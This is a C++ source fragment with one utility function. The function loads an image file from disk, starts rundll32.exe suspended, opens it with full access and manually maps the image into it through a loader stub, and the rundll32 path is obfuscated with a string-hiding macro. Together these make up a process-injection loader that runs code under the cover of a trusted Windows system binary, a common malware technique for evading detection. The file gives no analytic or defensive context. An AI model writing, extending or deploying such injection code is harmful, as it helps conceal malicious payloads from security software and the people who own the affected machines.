#include <Include.hpp>

bool Util::map_and_run_image(const std::string& path, uint8_t* loader, size_t loader_length)
{
	if (path.empty() || !loader || !loader_length)
		return false;

	std::vector<uint8_t> image_buffer{};
	HANDLE host_handle{};
	uint32_t host_pid{};
	uint16_t result{};

	if (!Util::read_file_from_memory(path, image_buffer))
		return false;

	if (!Shared::Util::create_process(
		_XS(R"(C:\Windows\System32\rundll32.exe)"),
		CREATE_SUSPENDED, host_pid))
		return false;

	host_handle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, host_pid);

	if (host_handle == nullptr)
		return false;

	result = shared::mapping::load_library(
		(void*)image_buffer.data(), 
		host_handle, loader, loader_length);

	CloseHandle(host_handle);

	if (result != NULL)
		return false;

	return true;
}
